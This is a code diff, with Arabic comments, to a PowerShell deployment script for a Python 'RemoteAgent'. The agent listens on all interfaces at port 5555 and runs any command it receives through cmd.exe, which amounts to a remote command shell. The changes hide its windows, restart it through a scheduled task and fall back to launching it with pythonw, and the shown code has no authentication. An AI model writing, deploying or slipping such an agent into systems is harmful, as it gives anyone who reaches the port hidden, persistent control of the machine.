@@ -5,6 +5,7 @@ import socket
 import subprocess
 import threading
 import base64
+import os
 
 LISTEN_HOST = "0.0.0.0"
 LISTEN_PORT = 5555
@@ -37,13 +38,20 @@ def handle_client(conn, addr):
             if not cmd or cmd.lower() in ["exit", "quit"]:
                 break
             
-            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            stdout, stderr = proc.communicate()
+            # تنفيذ الأمر عبر cmd.exe بشكل مباشر مع دعم كامل للأوامر الإدارية
+            proc = subprocess.Popen(
+                ["cmd.exe", "/c", cmd],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            stdout, stderr = proc.communicate(timeout=15)
             output = stdout + stderr
             if not output:
-                output = b"[+] Command executed successfully.\n"
+                output = b"[+] Command sent and executed successfully.\n"
             conn.sendall(output)
-    except Exception:
+    except Exception as e:
         pass
     finally:
         conn.close()
@@ -65,15 +73,11 @@ if __name__ == "__main__":
 
 [System.IO.File]::WriteAllText("C:\RemoteAgent\agent.py", $agentCode, [System.Text.Encoding]::UTF8)
 
-# إنهاء أي عملية agent قديمة متوقفة في الخلفية
+# إنهاء العمليات السابقة وإعادة التشغيل
 Stop-Process -Name "pythonw" -ErrorAction SilentlyContinue
 Stop-Process -Name "python" -ErrorAction SilentlyContinue
 
-# إعادت تشغيل المهمة المجدولة
 Start-ScheduledTask -TaskName "RemoteAgent" -ErrorAction SilentlyContinue
-if ($?) {
-    Write-Host "Agent updated and restarted successfully!" -ForegroundColor Green
-} else {
-    # تشغيل مباشر في حال عدم وجود المهمة المجدولة
+if (-not $?) {
     Start-Process -FilePath "C:\Program Files\Python312\pythonw.exe" -ArgumentList "C:\RemoteAgent\agent.py"
 }
